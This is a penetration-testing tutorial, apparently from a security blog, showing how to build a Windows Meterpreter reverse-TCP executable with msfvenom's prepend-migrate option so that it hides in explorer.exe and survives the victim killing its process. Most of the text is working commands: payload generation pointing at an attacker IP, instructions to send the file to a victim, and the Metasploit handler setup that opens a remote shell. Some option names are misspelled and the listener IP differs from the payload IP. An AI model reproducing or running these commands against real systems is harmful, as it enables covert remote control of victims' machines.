@@ -1,0 +1,29 @@
+
+Hiding Shell with Prepend Migrate using Msfvenom
+
+If you are a network penetration tester then you must read this article to enhance your skill. It is the part of advance penetration testing which might help in creating a strong payload for an attack to the targeted system. In this article your will learn more about the strength of msfvenom, here we will create such a payload which is different from my previous tutorial. The payload migrate its process if current process gets killed hence attacker will not lose his session if victim kills the current process ID of the payload from its system.
+LETS!!! START
+Open the terminal in kali Linux and type following command to generate exe payload.
+Msfvenom –p windows/meterpreter/reverse_tcp lhost=192.168.1.104 lport=5555 prependmigrate=true prepenmigrateprocess=explorer.exe –f exe > /root/Desktop/raj.exe
+Above command will create the raj.exe file on the Desktop now send this file to remote system for attack.
+
+Load metasploit framework and type following command to start the attack.
+msfconsole
+use multi/handler
+msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
+msf exploit(handler) > set lhost 192.168.0.104
+msf exploit(handler) > set lport 5555
+msf exploit(handler) > exploit
+ When victim will open raj.exe file we will get meterpreter session.
+meterpreter> sysinfo
+
+Now let check the process ID of our payload.
+meterpreter> ps
+From the highlighted text you can read the process ID shown for raj.exe i.e. 4960.
+
+Now attacker tries himself to kill the current process state for raj.exe to verify process migration, as result process 4960 get killed.
+meterpreter> kill 4960
+ But!!!  Still we have victim’s session which means raj.exe file migrate into new process ID.
+meterpreter> sysinfo
+
+Author: AArti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact here
